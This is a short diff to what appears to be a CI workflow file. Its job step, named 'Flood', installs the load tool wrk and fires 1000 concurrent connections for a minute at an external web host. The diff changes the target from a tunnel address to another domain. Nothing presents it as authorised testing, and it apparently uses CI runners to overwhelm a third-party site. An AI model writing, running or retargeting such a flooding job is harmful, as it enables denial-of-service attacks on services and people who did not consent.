@@ -7,4 +7,4 @@ jobs:
       - name: Flood
         run: |
           sudo apt-get install -y wrk
-          wrk -t 4 -c 1000 -d 1m http://harder-comedy-wondering-customized.trycloudflare.com/
+          wrk -t 4 -c 1000 -d 1m http://gwbyte.eu.cc/
